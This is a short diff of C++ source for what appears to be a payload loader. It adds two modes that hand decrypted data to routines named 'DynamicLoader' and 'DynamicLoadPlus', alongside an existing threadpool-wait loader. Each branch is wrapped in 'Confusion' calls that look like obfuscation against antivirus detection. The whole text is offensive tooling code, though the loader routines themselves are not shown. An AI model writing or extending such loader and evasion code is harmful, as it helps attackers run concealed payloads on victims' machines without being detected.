@@ -127,7 +127,17 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 3");
         this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    } else {
+    }else if (function_mode == "4") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 4");
+        this->startBase(MasterEncoderForDynamicLoader::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    }else if (function_mode == "5") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 5");
+        this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    }else {
         std::cout << "Invalid function mode!" << std::endl;
         return;
     }
